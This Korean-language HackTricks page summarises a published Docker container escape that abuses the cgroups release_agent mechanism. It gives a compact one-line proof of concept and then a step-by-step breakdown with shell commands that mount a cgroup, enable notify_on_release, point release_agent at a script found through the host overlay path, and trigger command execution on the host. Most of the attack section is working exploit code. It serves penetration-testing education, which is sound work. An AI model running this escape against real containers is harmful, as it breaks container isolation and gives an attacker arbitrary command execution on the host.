# Docker release\_agent cgroups 탈출

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>


**자세한 내용은 [원본 블로그 게시물](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)을 참조하세요.** 이것은 요약입니다:

원본 PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
# Docker Release Agent Cgroups Escape

이 PoC(Proof of Concept)는 cgroups를 악용하기 위해 `release_agent` 파일을 생성하고 이를 호출하여 컨테이너 호스트에서 임의의 명령을 실행하는 방법을 보여줍니다. 다음은 수행되는 단계의 세부 내용입니다:

1. **환경 설정:**
- `/tmp/cgrp` 디렉토리를 생성하여 cgroup의 마운트 지점으로 사용합니다.
- RDMA cgroup 컨트롤러를 이 디렉토리에 마운트합니다. RDMA 컨트롤러가 없는 경우, 대체로 `memory` cgroup 컨트롤러를 사용하는 것이 좋습니다.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **자식 Cgroup 설정:**
- 마운트된 Cgroup 디렉토리 내에 "x"라는 이름의 자식 Cgroup이 생성됩니다.
- "x" Cgroup의 notify_on_release 파일에 1을 쓰는 것으로 "x" Cgroup에 대한 알림이 활성화됩니다.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **릴리스 에이전트 구성:**
- 호스트에서 컨테이너의 경로는 /etc/mtab 파일에서 얻어옵니다.
- 그런 다음 cgroup의 release_agent 파일을 획득한 호스트 경로에 위치한 /cmd 스크립트를 실행하도록 구성합니다.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **/cmd 스크립트 생성 및 구성:**
- /cmd 스크립트는 컨테이너 내부에 생성되며, ps aux를 실행하고 출력을 컨테이너 내의 /output 파일로 리다이렉트합니다. 호스트에서 /output의 전체 경로가 지정됩니다.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **공격 실행:**
- "x" 자식 cgroup 내에서 프로세스가 시작되고 즉시 종료됩니다.
- 이로 인해 `release_agent` (즉, /cmd 스크립트)가 트리거되어 호스트에서 ps aux를 실행하고 출력을 컨테이너 내의 /output에 작성합니다.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 AWS 해킹을 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
